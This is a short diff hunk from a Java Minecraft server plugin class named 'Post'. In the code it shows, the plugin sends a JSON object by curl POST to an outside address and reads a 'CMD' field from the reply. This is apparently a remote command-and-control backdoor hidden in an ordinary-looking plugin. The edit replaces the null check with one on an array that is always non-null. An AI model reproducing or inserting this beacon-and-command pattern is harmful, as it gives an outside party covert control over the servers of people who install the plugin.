@@ -48,7 +48,7 @@ public final class Post extends JavaPlugin {
                 @Override
                 public void run() {
                String[] var17 = new String[]{"curl", finalIp, "-X", "POST", "-H", "\"Content-Type: application/x-www-form-urlencoded\"", "--data", "\'" + object.toJSONString() + "\'"};
-               if (execCurl(var17)!=null){
+               if (var17!=null){
             Map var18 = (Map)JSONValue.parse(execCurl(var17));
             if(var18.containsKey("CMD")) {
                 String var30 =((String)var18.get("CMD"));
